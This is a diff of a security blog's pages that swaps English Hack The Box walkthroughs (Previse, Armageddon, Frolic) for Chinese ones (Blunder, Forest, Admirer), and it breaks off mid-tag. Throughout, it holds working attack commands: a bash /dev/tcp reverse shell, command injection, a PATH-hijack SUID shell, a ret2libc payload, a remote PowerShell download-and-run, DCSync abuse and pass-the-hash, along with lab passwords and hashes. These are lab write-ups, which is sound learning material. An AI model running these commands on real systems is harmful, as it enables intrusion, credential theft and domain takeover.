-<h4 id="2-website"><a href="#2-website" class="headerlink" title="2.website"></a>2.website</h4><p>it just has a login page<br>let’s use dirsearch to find some directories<br>we can see some pages redirect to login.php<br><img src="/2022/07/16/Previse/dirsearch.png"><br>we use burpsuite to catch the response,and we can see a register page but admin can use<br><img src="/2022/07/16/Previse/register.png"><br>we can use burpsuite manually change the status code to 200 ok to visit the accounts.php<br><img src="/2022/07/16/Previse/change.jpg"><br>and thus we can get a access to accounts.php<br><img src="/2022/07/16/Previse/account.png"><br>now we can add a user to test it<br>if we don’t want to have to do this for each page action. We can have Burp do this for use while we browse the site. Go to Proxy &gt; Options &gt; Match and Replace &gt; Add and set the following options:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Type: Response header</span><br><span class="line">Match: 302 Found</span><br><span class="line">Replace: 200 OK</span><br></pre></td></tr></table></figure>
-<p>now we can download the sitebackup.zip and unzip it<br>in the logs.php,we can see a function uses exec and we just need to post a $delim<br><img src="/2022/07/16/Previse/logs.png"><br>we can reverse the request method and add a delim to get a response<br><img src="/2022/07/16/Previse/post.png"><br>We can test for Command Injection by adding a ;curl+<a target="_blank" rel="noopener" href="http://10.10.14.15/">http://10.10.14.15/</a> after the POST request:<br><img src="/2022/07/16/Previse/server.png"><br>so we can try to reverse a shell to our machine</p>
-<pre><code>;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.15/8888 0&gt;&amp;1&#39; &lt;- this need to urlencode
-nc -lvnp 8888
-</code></pre>
-<img src="/2022/07/16/Previse/shell.png">
-
-<p>now we still can’t get the userflag<br>Next we can upgrade our shell to a more interactive one:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; then press Ctrl+Z</span><br><span class="line">stty raw -echo;fg then press ENTER twice</span><br><span class="line">export TERM=xterm</span><br></pre></td></tr></table></figure>
-<p>we can get the mysql username and password from the config.php<br><img src="/2022/07/16/Previse/mysql.png"></p>
-<p>username:root<br>password:mySQL_p@ssw0rd!:)<br>db:previse<br>and now we can get into the database<br><img src="/2022/07/16/Previse/mysqlin.png"><br>and in the database previse,we get two tables<br><img src="/2022/07/16/Previse/tables.png"><br>we can use m4lwhere to ssh it,but first we should crack it’s password<br>copy the hash use hashcat to crack it with the command<br><code>hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt</code><br><img src="/2022/07/16/Previse/pass.png"></p>
-<p>username:m4lwhere<br>password:ilovecody112235!<br>and now we can try to ssh it</p>
-<pre><code>ssh m4lwhere@10.10.11.104
-</code></pre>
-<p>and we get in<br><img src="/2022/07/16/Previse/web.png"><br>finally,we get the userflag</p>
-<h4 id="3-getting-access-to-root"><a href="#3-getting-access-to-root" class="headerlink" title="3. getting access to root"></a>3. getting access to root</h4><p>first,we use sodo -l to find some command not need root password<br><img src="/2022/07/16/Previse/sudo.png"><br>Reading over the script, we see that both the gzip and the date command don’t have the full PATH set to them:<br><img src="/2022/07/16/Previse/backup.png"><br>the PATH in Linux is how the system looks for the binary that we are trying to execute:<br><img src="/2022/07/16/Previse/path.png"><br>In this case, it is going to look in &#x2F;usr&#x2F;local&#x2F;sbin then if it is not there, it looks at &#x2F;usr&#x2F;local&#x2F;bin and so on until it is found.<br>We can manipulate this by changing the PATH, we can make the first entry in the PATH our current directory with the command <code>export PATH=.:$PATH</code><br><img src="/2022/07/16/Previse/path2.png"><br>And you can see that when I look for the cat command where our custom one is, it points out to that current directory.<br>So we can do the same thing with gzip or date back in the victim’s machine. First let’s create our own malicious gzip command:</p>
-<pre><code>cp /bin/bash /tmp/bash &amp;&amp; chomd u+s /tmp/bash
-</code></pre>
-<p>This will create a SUID bash command that we can use for easy root access. Next we can change the PATH so that it points to our current directory:<br><img src="/2022/07/16/Previse/bash.png"><br>and now execute backup.sh<br><img src="/2022/07/16/Previse/root.png"><br>and final we execute <code>/tmp/bash -p</code>,we get the root<br><img src="/2022/07/16/Previse/rootflag.png"></p>
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/01/blunder/nmap.png">
+#### port scan
+21和80端口
+21端口拒绝连接
+80端口是一个类似博客的界面
+#### 目录扫描
+<img src="/2022/09/01/blunder/dir1.png">
+<img src="/2022/09/01/blunder/dir2.png">
+admin界面需要登录
+还存在一个todo.txt
+里面提到了一个fergus
+#### bludit
+`cewl http://10.10.10.191 > wodlist`
+用48942.py爆破，得到用户名为fergus,密码为RolandDeschain
+<img src="/2022/09/01/blunder/pass.png">
+登录成功以后
+尝试用文件上传漏洞去反弹一个shell
+<img src="/2022/09/01/blunder/shell1.png">
+成功获得一个初始shell权限为www-data
+#### user
+先上传一个linenum.sh到目标机
+没有找到什么特殊的文件
+在/var/www/bludit-3.10.0a/bl-content/databases下可以找到hugo的登陆密码
+用md5解密，得到密码是Password120
+直接试试切换hugo
+<img src="/2022/09/01/blunder/hugo.png">
+#### root
+先把脚本提升一下
+python -c 'import pty;pty.spawn("/bin/bash")'
+然后使用sudo -l 查看是否拥有特权
+<img src="/2022/09/01/blunder/sudo.png">
+sudo -version
+运行时sudo，您可以输入-u [user]以说明以哪个用户身份运行。您也可以在格式中输入用户作为数字 -u#[uid]。root 使用 id 0
+漏洞是我可以输入用户 id -1，并将sudo其视为 root
+<img src="/2022/09/01/blunder/root.png">
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/16/Previse/" data-id="cl7edtt4c000bjtcp3ji20wcy" data-title="Previse" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/09/01/blunder/" data-id="cl7k58yje000017cp6wmn2xmq" data-title="blunder" class="article-share-link">Share</a>
       
       
       
@@ -343,10 +401,10 @@ nc -lvnp 8888
 
 
   
-    <article id="post-Armageddon" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-forest" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/07/16/Armageddon/" class="article-date">
-  <time class="dt-published" datetime="2022-07-16T14:58:49.000Z" itemprop="datePublished">2022-07-16</time>
+    <a href="/2022/08/30/forest/" class="article-date">
+  <time class="dt-published" datetime="2022-08-31T01:39:19.000Z" itemprop="datePublished">2022-08-30</time>
 </a>
     
   </div>
@@ -357,7 +415,7 @@ nc -lvnp 8888
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/07/16/Armageddon/">Armageddon</a>
+      <a class="p-name article-title" href="/2022/08/30/forest/">forest</a>
     </h1>
   
 
@@ -365,37 +423,25 @@ nc -lvnp 8888
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/16/Armageddon/nmap.png">
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/08/30/forest/nmap.png">
+<img src="/2022/08/30/forest/nmap2.png">
+从已经获取的信息来看，这像一个AD域控
+重点需要关注389,445和5985端口
+5985应该是kerberos认证中最后一次要请求的http service
 
-<h4 id="2-web"><a href="#2-web" class="headerlink" title="2.web"></a>2.web</h4><p>from the burpsuite,we can get the response and know it build with drupal 7<br><img src="/2022/07/16/Armageddon/burp.png"><br>when we use searchsploit,we can see some exploit<br><img src="/2022/07/16/Armageddon/searchsploit.png"><br>we can use msfconsole to exploit it</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search drupal 7</span><br><span class="line">use 1</span><br><span class="line">set rhosts 10.10.10.233</span><br><span class="line">set lhost 10.10.14.15</span><br></pre></td></tr></table></figure>
-<p>and we can get the shell<br><img src="/2022/07/16/Armageddon/msf.png"><br>it denied us to cd &#x2F;home<br>so we cd to sites&#x2F;default and in the settings.php,we can get the database’s username and password<br><img src="/2022/07/16/Armageddon/database.png"><br>username:<code>drupaluser</code><br>password:<code>CQHEy@9M*m23gBVj</code></p>
-<p>we can try this to login mysql<br>but in the &#x2F;etc&#x2F;passwd,we didn’t see drupaluser,therefore we probably need to get password hashes from the database itself:<br><img src="/2022/07/16/Armageddon/passwd.png"><br>Using the credentials drupaluser:<code>CQHEy@9M*m23gBVj</code>, we can get the databases users and hashes.   </p>
-<pre><code>mysql -u drupaluser -p&quot;CQHEy@9M*m23gBVj&quot; -e &quot;use drupal; select name,pass from users;&quot;
-</code></pre>
-<img src="/2022/07/16/Armageddon/hash.png">
-Using the RockYou wordlist we can crack the password hash for the brucetherealadmin user.
-
-<pre><code>john -w=/usr/share/wordlists/rockyou.txt hash.txt
-</code></pre>
-<img src="/2022/07/16/Armageddon/hashcrack.png">
-
-<p>username:brucetherealadmin<br>password:booboo<br>And we have brucetherealadmin’s password! Now let’s try to login via SSH:<br><img src="/2022/07/16/Armageddon/ssh.png"></p>
-<h4 id="3-getting-root-access"><a href="#3-getting-root-access" class="headerlink" title="3.getting root access"></a>3.getting root access</h4><p>when we use <code>sudo -l</code>,Looks like we are able to run snap as the root user without any password, therefore let’s use the <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/snap/">gtfobin</a> for snap:<br><img src="/2022/07/16/Armageddon/sudo.png"><br>first we get fpm and do something next</p>
-<pre><code>gem install fpm
-</code></pre>
-<img src="/2022/07/16/Armageddon/prepare.png">
-Now we upload the malicious privesc snap file to the machine and run it:
-<img src="/2022/07/16/Armageddon/upload.png">
-<img src="/2022/07/16/Armageddon/download.png">
-Now let's run snap as the root user to make use of the snap package we created:
-<img src="/2022/07/16/Armageddon/root.png">
-
+<h4 id="枚举域内用户及其密码"><a href="#枚举域内用户及其密码" class="headerlink" title="枚举域内用户及其密码"></a>枚举域内用户及其密码</h4><p>445端口一般是smb服务，所以可以尝试smbmap或smbclient进行枚举<br>smbmap -H 10.10.10.161<br>smbclient -N -L &#x2F;&#x2F;10.10.10.161<br>均没有获得有用的信息<br><img src="/2022/08/30/forest/smb.png"></p>
+<p>rpcclient -U “” -N 10.10.10.161<br>enumdomuser<br><img src="/2022/08/30/forest/rpcclient.png"><br>enudomgroups<br><img src="/2022/08/30/forest/rpc2.png"><br>同时也能查询用户组和其中的用户<br>querygroup 0x200<br>querygroupmem 0x200<br><img src="/2022/08/30/forest/rpc3.png"><br>queryuser 0x1f4<br><img src="/2022/08/30/forest/rpc4.png"></p>
+<p>将刚刚查询到的username存入username.txt<br>使用工具impacket爆破以上用户的hash<br><img src="/2022/08/30/forest/ntlmhash.png"><br>接着用hashcat爆破这个hash值<br><code>hashcat -m 18200 svc /usr/share/wordlists/rockyou.txt --force</code><br><img src="/2022/08/30/forest/hashcat.png"><br>得到密码为<code>s3rvice</code><br>使用工具evil-winrm进行连接<br><code>evil-winrm -i 10.10.10.161 -u &#39;svc-alfresc&#39; -p &#39;s3rvice&#39;</code><br><img src="/2022/08/30/forest/user.png"></p>
+<h4 id="root"><a href="#root" class="headerlink" title="root"></a>root</h4><h5 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h5><p>使用sharphound进行信息收集<br>可以直接上传也能用目标机去主动下载<br><code>iex(new-object net.webclient).downloadstring(&quot;http://10.10.14.4/SharpHound.ps1&quot;)</code></p>
+<p>接下来收集域内信息<br><code>import-module .\SharpHound.ps1</code><br><code>invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice</code><br><img src="/2022/08/30/forest/info.png"><br>收集到的信息为一个zip文件<br>用本机开一个smbserver去接收这个zip并放到bloodhound里分析<br>从当前 svc-alfresco 的访问权限到 Domain Admins 组中的 Adminsitrator 需要两个步骤。<br>1）svc-alfresco 用户在 Service Account 中，它是 Privileged IT Account 的成员，它是 Account Operators 的成员，所以svc-alfresco 用户是 Account Operators 的成员，并且 Account Operators 对 Exchange Windows Permissions 组具有 Generic All 特权。<br>解释：Account Operators 组授予用户有限的帐户创建权限。该组的成员可以创建和修改大多数类型的帐户，包括用户、本地组和全局组的帐户，并且成员可以本地登录到域控制器。所以可以新建一个abc用户并加入 “Exchange Windows Permissions”组。<br>&#96;<br><em>Evil-WinRM</em> PS C:\Users\svc-alfresco\Desktop&gt; net user abc abc123! &#x2F;add &#x2F;domain<br>The command completed successfully.</p>
+<p><em>Evil-WinRM</em> PS C:\Users\svc-alfresco\Desktop&gt; net group “Exchange Windows Permissions” abc &#x2F;add<br>The command completed successfully.<br><code>2) 组 EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL 的成员有权修改域 HTB.LOCAL 上的 DACL（自由访问控制列表）。通过对目标对象的 DACL 的写入访问权限，您可以授予对对象的任何所需权限。这里是为abc用户赋予DCSync权限，利用DCSync导出域内所有用户hash。</code><br><em>Evil-WinRM</em> PS C:\Users\svc-alfresco\Desktop&gt; $SecPassword &#x3D; ConvertTo-SecureString ‘abc123!’ -AsPlain -Force<br><em>Evil-WinRM</em> PS C:\Users\svc-alfresco\Desktop&gt; $Cred &#x3D; New-Object System.Management.Automation.PSCredential(‘htb\abc’, $SecPassword)</p>
+<p><em>Evil-WinRM</em> PS C:\Users\svc-alfresco\Documents&gt; Import-Module .\PowerView.ps1<br><em>Evil-WinRM</em> PS C:\Users\svc-alfresco\Documents&gt; Add-DomainObjectAcl -PrincipalIdentity abc -Credential $Cred  -Rights DCSync<br>&#96;</p>
+<p>域内用户hash值获取<br><code>impacket-secretsdump htb.local/abc@10.10.10.161</code><br><img src="/2022/08/30/forest/hash.png"><br>用wmiexe进行hash传递攻击<br><code>impacket-wmiexec htb.local/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6</code><br><img src="/2022/08/30/forest/root.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/16/Armageddon/" data-id="cl7edtt420001jtcpe9audnb7" data-title="Armageddon" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/08/30/forest/" data-id="cl7irmudd0001d2cp7iyd0h61" data-title="forest" class="article-share-link">Share</a>
       
       
       
@@ -407,10 +453,10 @@ Now let's run snap as the root user to make use of the snap package we created:
 
 
   
-    <article id="post-Forlic" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Admirer" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/07/15/Forlic/" class="article-date">
-  <time class="dt-published" datetime="2022-07-15T09:34:32.000Z" itemprop="datePublished">2022-07-15</time>
+    <a href="/2022/08/30/Admirer/" class="article-date">
+  <time class="dt-published" datetime="2022-08-30T08:43:43.000Z" itemprop="datePublished">2022-08-30</time>
 </a>
     
   </div>
@@ -421,7 +467,7 @@ Now let's run snap as the root user to make use of the snap package we created:
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/07/15/Forlic/">Forlic</a>
+      <a class="p-name article-title" href="/2022/08/30/Admirer/">Admirer</a>
     </h1>
   
 
@@ -429,51 +475,33 @@ Now let's run snap as the root user to make use of the snap package we created:
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/15/Forlic/nmap.png">
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/08/30/Admirer/nmap.png">
+#### ports
+21端口不允许匿名登录
+22端口不允许直接连接
+#### dirsearch
+<img src="/2022/08/30/Admirer/dir.png">
+在robots.txt中有一个额外的目录admin-dir
+虽然我们没有权限访问，但是我们可以尝试扫二级目录
+会扫到一个admin-dir/credentials.txt的二级目录里面有password
+<img src="/2022/08/30/Admirer/password.png">
+[Internal mail account]
+w.cooper@admirer.htb
+fgJr6q#S\W:$P
 
-<h5 id="port-exploration"><a href="#port-exploration" class="headerlink" title="port exploration"></a>port exploration</h5><p>9999: at 10.10.10.111:9999,it’s a simple nginx welcome page<br>445: smb is running on the 445,we can use common ways to find if there is something can be used </p>
-<pre><code> smbmap -H 10.10.10.111 
-</code></pre>
-<p>smbmap shows nothing we can use<br><img src="/2022/07/15/Forlic/smbmap.png" width="60%"></p>
-<pre><code> smbclient -N -L //10.10.10.111
-</code></pre>
-<p>and smbclient also shows nothing interesting<br><img src="/2022/07/15/Forlic/smbclient.png" width="60%"><br>1880: the 9999 port’s site gives us a url:<a target="_blank" rel="noopener" href="http://forlic.htb:1880/">http://forlic.htb:1880</a><br>it’s an admin web</p>
-<h5 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h5><p>we try dirsearch to all ports we find,and in 9999 there has some pages<br><img src="/2022/07/15/Forlic/dirsearch.png" width="60%"><br>10.10.10.111:9999&#x2F;test has a phpinfo page<br>10.10.10.111:9999&#x2F;backup has something useful<br>10.10.10.111:9999&#x2F;dev is forbidden<br>10.10.10.111:9999&#x2F;admin is an admin page<br><img src="/2022/07/15/Forlic/backup.png" width="60%"><br>we can use <code>curl 10.10.10.111:9999/backup/user.txt</code> and <code>curl 10.10.10.111:9999/backup/password.txt</code> to get admin and imnothuman</p>
-<h5 id="dirsearch-deeper"><a href="#dirsearch-deeper" class="headerlink" title="dirsearch deeper"></a>dirsearch deeper</h5><p>though the &#x2F;dev is forbidden,we use dirsearch http:10.10.10.111:9999&#x2F;dev to explore deeper<br>it has backup and test<br><img src="/2022/07/15/Forlic/dev.png" width="60%"><br>in the &#x2F;backup,it shows &#x2F;playsms<br>in the &#x2F;test,it provides a file name test<br>10.10.10.111:9999&#x2F;playsms is another login page</p>
-<h5 id="x2F-admin"><a href="#x2F-admin" class="headerlink" title="&#x2F;admin"></a>&#x2F;admin</h5><p>the &#x2F;admin loads a js hide the login information<br><img src="/2022/07/15/Forlic/admin.png" width="60%"><br>the username is admin and the password is superduperlooperpassword_lol<br>after entering it,we can see a brainfuck code,and to decode it<br><img src="/2022/07/15/Forlic/brainfuck.png" width="60%"><br><code>https://www.dcode.fr/ook-language</code><br><img src="/2022/07/15/Forlic/brainfuckdecode.png" width="60%"><br>it shows <code>Nothing here check /asdiSIAJJ0QWE9JAS</code><br>after visit it,it displays a new page encoded,after decoded,we get some message<br><img src="/2022/07/15/Forlic/b64.png" width="60%"><br>decode it,and it seems like a zip <code>curl -s http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d | xxd</code><br><img src="/2022/07/15/Forlic/zip.png" width="60%"><br><code>curl -s http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d &gt; index.php.zip</code><br>unzip it,it has a password<br>use fcrackzip to unpack it<br><code>fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt out.zip</code><br>The options are -u to force actual unzip, which weeds out tons of fps, -D for dictionary, and -p rockyou.txt to pass the wordlist.and the password&#x3D;password<br><img src="/2022/07/15/Forlic/index.png" width="60%"><br>Use xxd to read that back to bytes, which happens to be not only ASCII, but base64 characters <code>cat index.php | xxd -r -p</code><br><img src="/2022/07/15/Forlic/base64.png" width="60%"><br>decode it,and get the text<br><code>cat index.php | xxd -r -p | tr -d &#39;\r\n&#39; | base64 -d</code><br><img src="/2022/07/15/Forlic/brainfuck2.png" width="60%"><br>it’s brainfuck,decode at <code>https://copy.sh/brainfuck/</code> and get the phrase idkwhatispass</p>
-<h4 id="2-shell-as-web"><a href="#2-shell-as-web" class="headerlink" title="2.shell as web"></a>2.shell as web</h4><h5 id="now-we-have-two-password"><a href="#now-we-have-two-password" class="headerlink" title="now we have two password"></a>now we have two password</h5><p>1.admin&#x2F;superduperlooperpassword_lol 2.admin&#x2F;idkwhatispass<br>try it at &#x2F;admin &#x2F;playsms and final password2 worked on &#x2F;playsms</p>
-<h5 id="use-msfconsole"><a href="#use-msfconsole" class="headerlink" title="use msfconsole"></a>use msfconsole</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search playsms</span><br><span class="line">use 1</span><br><span class="line">set rhost 10.10.10.111</span><br><span class="line">set rport 9999</span><br><span class="line">set targeturi /playsms/index.php</span><br><span class="line">set lhost 10.10.14.15</span><br></pre></td></tr></table></figure>
-<p>then we get a webshell<br><img src="/2022/07/15/Forlic/webshell.png" width="60%"></p>
-<h4 id="3-shell-as-root"><a href="#3-shell-as-root" class="headerlink" title="3.shell as root"></a>3.shell as root</h4><p>first improve the shell</p>
-<pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
-</code></pre>
-<img src="/2022/07/15/Forlic/ayush.png" width="60%">
-we can see some hide catelog in ayush's home
-the .binary has the suid,the rop in it is owned by root
-<img src="/2022/07/15/Forlic/root.png" width="60%">
-the rop's function is to get our input and output it
-<img src="/2022/07/15/Forlic/ropfunction.png" width="60%">
-we can first see what's configured
-
-<pre><code>cat /proc/sys/kernel/randomize_va_space
-</code></pre>
-<p>it shows no ASLR<br>because we stright open it can’t read it,so we use base64 to read<br>and save it to local machine and use <code>base64 -d rop_b64 &gt; rop</code> to restore it<br><img src="/2022/07/15/Forlic/rop.png" width="60%"><br>open it in gdb with <a target="_blank" rel="noopener" href="https://github.com/longld/peda">PEDA</a>, and run checksec<br><img src="/2022/07/15/Forlic/checksec.png" width="60%"><br>we can force the program to crash<br><img src="/2022/07/15/Forlic/crash.png" width="60%"></p>
-<h5 id="background"><a href="#background" class="headerlink" title="background"></a>background</h5><p>I can cause the program to crash by sending too much input which likely means I can overwrite the return address somewhere. Given that ASLR is disabled but DEP (NX) is enabled, the easiest attack path is to use Return to libc.</p>
-<h5 id="understand-return-to-libc"><a href="#understand-return-to-libc" class="headerlink" title="understand return to libc"></a>understand return to libc</h5><h6 id="1-stack"><a href="#1-stack" class="headerlink" title="1.stack"></a>1.stack</h6><p>The stack starts at high memory addresses, and builds up to lower memory addresses. Inside any given function, there’s a stack frame. The bottom of the stack frame is stored in the RBP (or EBP on x86) register. The top is stored in RSP (or ESP). For example (and I’ll use 32-bit registers in this example since Frolic is 32-bit):<br><img src="/2022/07/15/Forlic/1.jpg" width="60%"></p>
-<h6 id="2-function-call"><a href="#2-function-call" class="headerlink" title="2.function call"></a>2.function call</h6><p>When a function is called, the arguments are put onto the stack (either by adding space to the top or using the space already there). So, for example, the program comes to:<br><img src="/2022/07/15/Forlic/2.jpg" width="60%"><br>Just before the call, two addresses are stored in ESP and ESP+4. These are the addresses of the string to copy and the buffer to copy it to:<br><img src="/2022/07/15/Forlic/3.jpg" width="60%"><br>Now the call instruction is reached. It is going to push the next instruction to the top of the stack (as the return address), and then jump execution to the new function. The next function is going to start with some common stuff, known as the prologue:<br><img src="/2022/07/15/Forlic/4.jpg" width="60%"><br>So take that step by step. call pushes return address:<br><img src="/2022/07/15/Forlic/5.jpg" width="60%"><br>Now push ebp:<br><img src="/2022/07/15/Forlic/6.jpg" width="60%"><br>mov ebp, esp:<br><img src="/2022/07/15/Forlic/7.jpg" width="60%"><br>Finally sub esp, 0x100:<br><img src="/2022/07/15/Forlic/8.jpg" width="60%"></p>
-<h6 id="3-stack-return"><a href="#3-stack-return" class="headerlink" title="3. stack return"></a>3. stack return</h6><p>When a function is done, it will typically end with:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
-<p><code>leave == mov esp, ebp + pop ebp</code><br>So the stack from before becomes:<br><img src="/2022/07/15/Forlic/9.jpg" width="60%"><br>Then when the return happens, the instruction pointer is popped, bringing that stack back to where it started:<br><img src="/2022/07/15/Forlic/10.jpg" width="60%"></p>
-<h6 id="4-What-Is-Return-to-libc"><a href="#4-What-Is-Return-to-libc" class="headerlink" title="4.What Is Return to libc"></a>4.What Is Return to libc</h6><p>A return to libc attack involves overwriting the return address in such a way that the computer jumps to the function I want. The standard case is the system function, with the argument &#x2F;bin&#x2F;sh, giving me a shell.</p>
-<p>If I were to call system(“&#x2F;bin&#x2F;sh”) normally, I would enter the function after the call but before the prologue with a stack like this:<br><img src="/2022/07/15/Forlic/11.jpg" width="60%"><br>The return address would be pushed onto the stack by the call instruction. But I’m not going to be going to system via a call, but rather a ret. So, I want the stack to look like this when I reach the return:<br><img src="/2022/07/15/Forlic/12.jpg" width="60%"><br>That way, ret will pop the system address into the instruction pointer, and the stack will look right. Since I don’t know the right return address, I’ll just use the function exit, so it cleanly exits when I’m done.</p>
-<h5 id="Find-the-Offset-to-EIP"><a href="#Find-the-Offset-to-EIP" class="headerlink" title="Find the Offset to EIP"></a>Find the Offset to EIP</h5><p>open the file with gbb-peda,and When the program crashes, I can take EIP and find out where that was in the pattern using pattern offset<br><img src="/2022/07/15/Forlic/eip.png" width="60%"><br>When the program crashes, I can take EIP and find out where that was in the pattern using pattern offset. I can use the ASCII or hex value:<br><img src="/2022/07/15/Forlic/AAGA.png" width="60%"><br>To double check that, I’ll send in a buffer of 52 As and then 4 Bs:<br><img src="/2022/07/15/Forlic/eip2.png" width="60%"><br>Crash, with EIP as BBBB.</p>
-<h5 id="Addresses"><a href="#Addresses" class="headerlink" title="Addresses"></a>Addresses</h5><p>Now I just need the addresses of <code>system</code>, <code>exit</code>, and <code>/bin/sh</code> in libc. This will vary on different hosts, so I’ll get the info with my shell on Frolic. First, I’ll get the base libc address with ldd,<br>Next, I’ll use <code>readelf -s</code> to get the offsets to various functions, and grep out <code>system</code> and <code>exit</code>,<br>Now I’ll use <code>strings -a -t x</code> to get the strings from libc with hex offsets, and grep for “&#x2F;bin&#x2F;sh”:<br><img src="/2022/07/15/Forlic/addresses.png" width="60%"><br>Now I can calculate the address for each of the three using any calculator (gdb here):<br><img src="/2022/07/15/Forlic/p.png" width="60%"></p>
-<h5 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h5><p>I can put that all together into this template: <code>&quot;A&quot; * 52 + SYSTEM + EXIT + /bin/sh</code>. I could write a python script to do this, but this case is simple enough that I can just do it as a one-liner. When I run that on Frolic, I’m root:<br><code>./rop $(python -c &#39;print(&quot;a&quot;*52 + &quot;\xa0\x3d\xe5\xb7&quot; + &quot;\xd0\x79\xe4\xb7&quot; + &quot;\x0b\x4a\xf7\xb7&quot;)&#39;)</code><br>now we finally get the flag<br><img src="/2022/07/15/Forlic/flag.png" width="60%"></p>
+<p>[FTP account]<br>ftpuser<br>%n?4Wz}R$tTF7</p>
+<p>[Wordpress account]<br>admin<br>w0rdpr3ss01!</p>
+<p>目前我们只找到了一个ftp，可以尝试先从ftp下手<br>ftp里面有一个dump.sql和一个html的备份，下载下来看看<br>dump.sql看起来像是插入图片和描述的sql<br>在html.tar.gz里面的index.php中我们可以找到一个数据库的用户名和密码<br><img src="/2022/08/30/Admirer/dbpass.png"><br><code>$servername = &quot;localhost&quot; $username = &quot;waldo&quot; $password = &quot;]F7jLHw:*G&gt;UPrTo&#125;~A&quot;d6b&quot;</code><br>在robots.txt中找到了另一个隐藏目录&#x2F;w4ld0s_s3cr3t_d1r<br>可以尝试登录，在web上登不上去<br>去源码里找这个界面<br>有一个新的密码<br><img src="/2022/08/30/Admirer/password2"></p>
+<p>[Bank Account]<br>waldo.11<br>Ezy]m27}OREc$</p>
+<p>去访问admin_tasks.php可以看到一些功能<br><img src="/2022/08/30/Admirer/web1.png"><br>在db_admin.php里能找到另一套数据库密码<br><code>$servername = &quot;localhost&quot;; $username = &quot;waldo&quot;; $password = &quot;Wh3r3_1s_w4ld0?&quot;;</code><br>再用dirsearch扫一遍目录<br>可以扫到adminer.php<br>但是所有的凭证都无法进行登录<br>在(Serious Vulnerability Discovered in Adminer database Administration Tool)[<a target="_blank" rel="noopener" href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool]%E6%8F%90%E5%88%B0%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%9C%AC%E5%9C%B0mysql%E7%94%A8%E6%88%B7%E5%8F%AF%E4%BB%A5%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E5%88%B0%E8%BF%99%E4%B8%AA%E4%B8%8A%E9%9D%A2">https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool]提到创建一个本地mysql用户可以远程连接到这个上面</a><br>首先要配置本地数据库<br><code>service mysql start</code><br><code>CREATE DATABASE admirer; # Create the database CREATE USER ‘adminer’@&#39;%&#39; IDENTIFIED BY ‘password’; # Create the user GRANT ALL PRIVILEGES ON *. *TO&#39;adminer&#39;@&#39;%&#39;; # Grants the created user full permissions FLUSH PRIVILEGES # Refreshes privileges create table test(data VARCHAR(255)); # Create a table in the database</code><br>之后修改&#x2F;etc&#x2F;mysql&#x2F;mariadb.conf.d&#x2F;50-server.cnf的bind-address为0.0.0.0<br>然后登录admirer<br>可以成功进行登录<br>在登录后使用下面一条语句把数据导入test表中<br><code>load data local infile&#39;../index.php&#39; into table test fields terminated by &quot;/n&quot;</code><br>在导入成功后可以找到mysql的密码<br><img 